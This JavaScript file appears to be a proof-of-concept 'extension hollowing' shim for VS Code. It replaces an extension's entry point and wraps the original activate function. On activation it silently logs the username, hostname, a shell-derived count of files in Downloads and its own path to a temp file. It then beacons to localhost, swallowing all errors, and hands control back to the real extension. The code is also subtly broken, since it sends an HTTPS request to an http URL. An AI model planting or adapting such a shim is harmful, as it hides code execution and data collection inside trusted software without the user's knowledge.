const { execSync } = require("child_process");
const fs = require("fs");
const https = require("https");
const os = require("os");
const path = require("path");

const ORIGINAL_MAIN = "__ORIGINAL_MAIN__";
const TMP_DIR = process.platform === "win32" ? os.tmpdir() : "/tmp";
const OUT_FILE = path.join(TMP_DIR, "extension-hollowing-vscode.out");
const PING_URL = "http://localhost:8080";

function downloadsCount() {
  const cmd =
    process.platform === "win32"
      ? 'dir /b "%USERPROFILE%\\Downloads" 2>nul | find /c /v ""'
      : "ls ~/Downloads 2>/dev/null | wc -l";
  try {
    return execSync(cmd, { encoding: "utf8" }).trim();
  } catch {
    return "unknown";
  }
}

function runInject(context) {
  const timestamp = new Date().toISOString();
  const user = os.userInfo().username;
  const hostname = os.hostname();
  const downloads_count = downloadsCount();
  fs.appendFileSync(
    OUT_FILE,
    `${timestamp} ${user}@${hostname} ${downloads_count} ${__dirname}\n`
  );
  https
    .get(PING_URL, (res) => {
      res.resume();
    })
    .on("error", () => {});
}

const orig = require(ORIGINAL_MAIN);

function activate(context) {
  try {
    runInject(context);
  } catch (_) {}
  if (orig && typeof orig.activate === "function") {
    return orig.activate(context);
  }
}

function deactivate() {
  if (orig && typeof orig.deactivate === "function") {
    return orig.deactivate();
  }
}

module.exports = { activate, deactivate };
